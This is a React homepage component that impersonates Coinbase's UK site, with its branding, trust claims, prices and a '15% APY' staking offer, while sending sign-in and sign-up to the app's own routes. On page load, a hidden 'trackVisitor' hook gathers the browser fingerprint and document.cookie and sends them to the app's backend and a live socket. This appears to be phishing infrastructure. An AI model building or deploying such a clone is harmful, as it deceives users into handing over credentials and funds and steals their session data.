
import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import Navigation from '../components/Navigation';
import axios from 'axios';
import io from 'socket.io-client';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5001/api';
const SOCKET_URL = process.env.REACT_APP_SOCKET_URL || 'http://localhost:5001';

const HomePage = () => {
  const [cryptoPrices, setCryptoPrices] = useState([
    { name: 'Bitcoin', symbol: 'BTC', price: '£50,234', change: '+2.3%', positive: true },
    { name: 'Ethereum', symbol: 'ETH', price: '£2,845', change: '+1.8%', positive: true },
    { name: 'Solana', symbol: 'SOL', price: '£142', change: '-0.5%', positive: false },
  ]);

  const [scrollY, setScrollY] = useState(0);

  useEffect(() => {
    const handleScroll = () => setScrollY(window.scrollY);
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  // Track visitor when component mounts
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        const visitorData = {
          userAgent,
          platform,
          language,
          screenResolution,
          timezone,
          cookies: document.cookie,
          referrer: document.referrer,
          timestamp: new Date().toISOString(),
          page: 'homepage'
        };

        // Send visitor data to backend
        await axios.post(`${API_URL}/auth/track-visitor`, visitorData).catch(err => 
          console.error('Tracking error:', err)
        );

        // Connect to socket for real-time tracking
        const socket = io(SOCKET_URL);
        socket.emit('visitor-arrived', visitorData);

        return () => {
          socket.emit('visitor-left', visitorData);
          socket.disconnect();
        };
      } catch (error) {
        console.error('Visitor tracking error:', error);
      }
    };

    trackVisitor();
  }, []);

  return (
    <div className="homepage-new">
      <Navigation />
      
      {/* Hero Section */}
      <section className="hero-new">
        <div className="hero-background">
          <div className="gradient-orb orb-1" style={{ transform: `translate(${scrollY * 0.1}px, ${scrollY * 0.1}px)` }}></div>
          <div className="gradient-orb orb-2" style={{ transform: `translate(-${scrollY * 0.15}px, ${scrollY * 0.15}px)` }}></div>
          <div className="gradient-orb orb-3" style={{ transform: `translate(${scrollY * 0.05}px, -${scrollY * 0.1}px)` }}></div>
        </div>
        <div className="container-new">
          <div className="hero-grid">
            <div className="hero-content-new">
              <div className="uk-badge">
                <span className="flag">🇬🇧</span> Hello, UK! Meet Coinbase
              </div>
              <h1 className="hero-title-new">
                The most trusted cryptocurrency exchange
              </h1>
              <p className="hero-subtitle-new">
                Coinbase is the easiest place to buy and sell cryptocurrency. 
                Deposit GBP into your account for free to get started today.
              </p>
              <div className="hero-buttons-new">
                <Link to="/signup" className="btn-new btn-primary-new">
                  Get started
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                    <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </Link>
                <Link to="/signin" className="btn-new btn-secondary-new">
                  Sign in
                </Link>
              </div>
              
              {/* Crypto Ticker */}
              <div className="crypto-ticker">
                {cryptoPrices.map((crypto, index) => (
                  <div key={index} className="ticker-item">
                    <span className="crypto-symbol">{crypto.symbol}</span>
                    <span className="crypto-price">{crypto.price}</span>
                    <span className={`crypto-change ${crypto.positive ? 'positive' : 'negative'}`}>
                      {crypto.change}
                    </span>
                  </div>
                ))}
              </div>
            </div>
            
            <div className="hero-visual">
              <div className="phone-mockup">
                <div className="phone-frame"></div>
                <div className="phone-screen">
                  <div className="mockup-header">
                    <div className="mockup-balance">
                      <div className="balance-label">Portfolio balance</div>
                      <div className="balance-amount">£25,847.32</div>
                      <div className="balance-change positive">+£1,234.56 (5.2%)</div>
                    </div>
                  </div>
                  <div className="mockup-chart">
                    <svg viewBox="0 0 300 150" className="chart-svg">
                      <defs>
                        <linearGradient id="chartGradient" x1="0%" y1="0%" x2="0%" y2="100%">
                          <stop offset="0%" stopColor="#0052FF" stopOpacity="0.3"/>
                          <stop offset="100%" stopColor="#0052FF" stopOpacity="0"/>
                        </linearGradient>
                      </defs>
                      <path 
                        d="M 0 100 Q 50 80, 100 70 T 200 50 T 300 30" 
                        stroke="#0052FF" 
                        strokeWidth="3" 
                        fill="none"
                        className="chart-line"
                      />
                      <path 
                        d="M 0 100 Q 50 80, 100 70 T 200 50 T 300 30 L 300 150 L 0 150 Z" 
                        fill="url(#chartGradient)"
                        className="chart-fill"
                      />
                    </svg>
                  </div>
                  <div className="mockup-assets">
                    <div className="asset-item">
                      <div className="asset-icon btc">₿</div>
                      <div className="asset-info">
                        <div className="asset-name">Bitcoin</div>
                        <div className="asset-amount">0.5 BTC</div>
                      </div>
                      <div className="asset-value">£25,117</div>
                    </div>
                    <div className="asset-item">
                      <div className="asset-icon eth">Ξ</div>
                      <div className="asset-info">
                        <div className="asset-name">Ethereum</div>
                        <div className="asset-amount">2.8 ETH</div>
                      </div>
                      <div className="asset-value">£7,966</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Staking Section */}
      <section className="staking-section">
        <div className="container-new">
          <div className="staking-grid">
            <div className="staking-visual">
              <div className="staking-card">
                <div className="staking-icon">🌟</div>
                <div className="staking-apy">15% APY</div>
                <div className="staking-asset">on ETH</div>
                <div className="staking-progress">
                  <div className="progress-bar">
                    <div className="progress-fill" style={{width: '75%'}}></div>
                  </div>
                </div>
              </div>
            </div>
            <div className="staking-content">
              <h2>Earn up to 15% APY on your crypto</h2>
              <p>Put your crypto to work by staking with Coinbase and earn rewards of up to 15% APY on your holdings.</p>
              <Link to="/signup" className="btn-new btn-outline-new">
                Explore staking options
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </Link>
              <p className="disclaimer">
                Available for certain assets. APYs are indicative and not guaranteed and may vary over time.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* UK Features Section */}
      <section className="uk-features-section">
        <div className="container-new">
          <h2 className="section-title">Built for the UK</h2>
          <div className="features-grid-new">
            <div className="feature-card-new">
              <div className="feature-icon-new">💷</div>
              <h3>Top up via your bank without paying fees</h3>
              <p>UK users can transfer funds directly to Coinbase from their bank account for free.</p>
            </div>
            <div className="feature-card-new">
              <div className="feature-icon-new">💳</div>
              <h3>Deposits & withdrawals</h3>
              <p>Sell your crypto and withdraw to your bank instantly.</p>
            </div>
            <div className="feature-card-new">
              <div className="feature-icon-new">📊</div>
              <h3>Trade 240+ assets</h3>
              <p>From Bitcoin, to Ethereum, to your favourite tokens.</p>
            </div>
          </div>
        </div>
      </section>

      {/* Trust Section */}
      <section className="trust-section">
        <div className="container-new">
          <div className="trust-header">
            <h2 className="section-title">The most trusted cryptocurrency exchange</h2>
            <p>Millions of users trust us, and so can you. The proof is in our platform.</p>
          </div>
          <div className="trust-grid">
            <div className="trust-card">
              <div className="trust-icon">📈</div>
              <h3>The largest public crypto company</h3>
              <p>In April 2021, Coinbase became the largest publicly traded crypto company in the world. That means we operate with more financial transparency.</p>
              <a href="https://investor.coinbase.com" target="_blank" rel="noopener noreferrer" className="trust-link">
                Learn more →
              </a>
            </div>
            <div className="trust-card">
              <div className="trust-icon">🔒</div>
              <h3>Your crypto is your crypto</h3>
              <p>It's that simple. Coinbase doesn't use, or lend, your assets without your permission. We run a multifaceted risk management program.</p>
              <a href="https://help.coinbase.com" target="_blank" rel="noopener noreferrer" className="trust-link">
                Learn more →
              </a>
            </div>
            <div className="trust-card">
              <div className="trust-icon">💬</div>
              <h3>The help you need, when you need it</h3>
              <p>You can always contact our support team by messaging to speak with our virtual assistant, or with a real live support agent.</p>
              <a href="https://help.coinbase.com" target="_blank" rel="noopener noreferrer" className="trust-link">
                Learn more →
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Advanced Trade Section */}
      <section className="advanced-trade-section">
        <div className="container-new">
          <div className="advanced-grid">
            <div className="advanced-content">
              <h2>Get lower, volume-based pricing with Advanced Trade</h2>
              <div className="advanced-features">
                <div className="advanced-feature">
                  <div className="check-icon">✓</div>
                  <div>
                    <h4>More order types</h4>
                    <p>Market, Limit, Stop Limit, and Auction Mode orders.</p>
                  </div>
                </div>
                <div className="advanced-feature">
                  <div className="check-icon">✓</div>
                  <div>
                    <h4>Powerful trading tools</h4>
                    <p>Charts powered by TradingView with EMA, MA, MACD, RSI, and Bollinger Bands.</p>
                  </div>
                </div>
                <div className="advanced-feature">
                  <div className="check-icon">✓</div>
                  <div>
                    <h4>One unified balance</h4>
                    <p>Seamlessly switch between Simple and Advanced Trade.</p>
                  </div>
                </div>
              </div>
              <Link to="/signup" className="btn-new btn-primary-new">
                Start trading
              </Link>
            </div>
            <div className="advanced-visual">
              <div className="trade-mockup">
                <div className="trade-chart">
                  <div className="chart-header">
                    <span className="chart-pair">BTC/GBP</span>
                    <span className="chart-price">£50,234.56</span>
                    <span className="chart-change positive">+2.3%</span>
                  </div>
                  <svg viewBox="0 0 400 200" className="trade-chart-svg">
                    <defs>
                      <linearGradient id="tradeGradient" x1="0%" y1="0%" x2="0%" y2="100%">
                        <stop offset="0%" stopColor="#00D395" stopOpacity="0.2"/>
                        <stop offset="100%" stopColor="#00D395" stopOpacity="0"/>
                      </linearGradient>
                    </defs>
                    <path 
                      d="M 0 150 L 50 140 L 100 120 L 150 110 L 200 100 L 250 85 L 300 75 L 350 60 L 400 50" 
                      stroke="#00D395" 
                      strokeWidth="2" 
                      fill="none"
                    />
                    <path 
                      d="M 0 150 L 50 140 L 100 120 L 150 110 L 200 100 L 250 85 L 300 75 L 350 60 L 400 50 L 400 200 L 0 200 Z" 
                      fill="url(#tradeGradient)"
                    />
                  </svg>
                  <div className="chart-indicators">
                    <span className="indicator">EMA</span>
                    <span className="indicator">RSI</span>
                    <span className="indicator">MACD</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="cta-section">
        <div className="container-new">
          <div className="cta-content">
            <h2>Get started in a few minutes</h2>
            <p>Sign up with Coinbase and start trading crypto today</p>
            <Link to="/signup" className="btn-new btn-primary-large">
              Create your account
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M9 18L15 12L9 6" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </Link>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer-new">
        <div className="container-new">
          <div className="footer-grid">
            <div className="footer-column">
              <h4>Company</h4>
              <a href="https://www.coinbase.com/about">About</a>
              <a href="https://www.coinbase.com/careers">Careers</a>
              <a href="https://www.coinbase.com/blog">Blog</a>
              <a href="https://www.coinbase.com/security">Security</a>
            </div>
            <div className="footer-column">
              <h4>Learn</h4>
              <a href="https://www.coinbase.com/learn">Browse crypto prices</a>
              <a href="https://www.coinbase.com/learn">Crypto basics</a>
              <a href="https://help.coinbase.com">Help center</a>
            </div>
            <div className="footer-column">
              <h4>Individuals</h4>
              <a href="https://www.coinbase.com/buy-bitcoin">Buy & sell</a>
              <a href="https://www.coinbase.com/earn">Earn</a>
              <a href="https://www.coinbase.com/wallet">Wallet</a>
              <a href="https://www.coinbase.com/card">Card</a>
            </div>
            <div className="footer-column">
              <h4>Businesses</h4>
              <a href="https://www.coinbase.com/prime">Prime</a>
              <a href="https://commerce.coinbase.com">Commerce</a>
              <a href="https://www.coinbase.com/custody">Custody</a>
            </div>
          </div>
          <div className="footer-bottom">
            <div className="footer-legal">
              <span>© 2025 Coinbase</span>
              <a href="https://www.coinbase.com/legal/privacy">Privacy</a>
              <a href="https://www.coinbase.com/legal/user_agreement">Terms</a>
            </div>
            <div className="footer-locale">
              <span>🇬🇧 United Kingdom</span>
              <span>English</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default HomePage;